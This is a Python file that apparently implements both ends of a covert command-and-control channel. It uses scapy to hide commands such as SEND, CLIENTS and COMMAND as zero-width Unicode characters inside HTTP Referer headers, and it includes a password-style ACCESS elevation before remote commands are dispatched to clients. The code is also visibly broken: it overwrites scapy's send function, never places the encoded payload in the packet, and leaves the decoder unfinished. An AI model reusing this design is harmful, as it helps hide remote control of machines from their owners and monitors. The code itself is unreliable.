from scapy.layers.http import HTTP, HTTPRequest
from scapy.layers.inet import IP
from scapy.sendrecv import send
from scapy.all import *
load_layer('http')

zero = '\u200c'  # 0
one = '\u200d'  # 1

send = "0000"
disconnect = "0001"
clients = "0010"
echo = "0011"
drop = "0100"

res = ''
final_res = ''
final_final_res = ''

''' CONTIANS CODE USED BY BOTH SERVER AND CLIENT'''
def binary_converter(message):
    global res

    message2 = message
    msg_list = message2.split()

    if msg_list[0] == 'SEND':
        res = send
        command_len = len(msg_list[0]) + 1
        message = message[command_len:]
    elif msg_list[0] == 'DISCONNECT':
        res = disconnect
        command_len = len(msg_list[0]) + 1
        message = message[command_len:]
    elif msg_list[0] == 'CLIENTS':
        res = clients
        command_len = len(msg_list[0]) + 1
        message = message[command_len:]
    elif msg_list[0] == 'ECHO':
        res = echo
        command_len = len(msg_list[0]) + 1
        message = message[command_len:]
    elif msg_list[0] == 'DROP':
        res = drop
        command_len = len(msg_list[0]) + 1
        message = message[command_len:]
    res += ''.join(format(ord(i), '08b') for i in message)

    return res
    # binary_to_unicode(res)


def binary_to_unicode(message):
    global final_res
    print("LEN: " + str(len(message)))
    for i in message:
        if i == '0':
            final_res += zero
        if i == '1':
            final_res += one
    return final_res

def unicode_to_binary(message):
    index1 = 0
    index2 = 3
    global final_final_res

    while index1 < len(message):
        if message[index1:index2] == b'\xe2\x80\x8c':
            final_final_res += "0"
        elif message[index1:index2] == b'\xe2\x80\x8d':
            final_final_res += "1"
        index1 += 3
        index2 += 3

    return final_final_res

def parser(self,message,client_instance):
        print(message)
        message = message[:100].split()
        print(message)
        if message != []:
            command = message[0]
            if command == "ACCESS" and len(message) == 2:
                    client_instance.elevatation(message[1])
            elif client_instance.elevated:
                print(client_instance.elevated)
                if command == "CLIENTS" and len(message) == 1:
                        self.cc.clients(client_instance)
                elif command == "COMMAND": 
                    if len(message) == 3:
                        print("Commad")
                        self.cc.command(message[1], message[2])
                    elif len(message) == 4:
                        self.cc.command(message[1], message[2], message[3])
                elif command == "DROP" and len(message) == 1:
                        client_instance.elevatation()

def construct_packet(self, ip, command, message=None):
        r_input = binary_converter(command + ' ' + message)
        print(r_input)
        r_input = binary_to_unicode(r_input)
        print(r_input)

        packet = IP(dst=ip)/HTTP()/HTTPRequest(
                    Referer=command
                )
        return bytes(packet)


def deconstruct_packet(self, packet):
    message = packet[HTTPRequest].Referer
    message = unicode_to_binary(message.encode())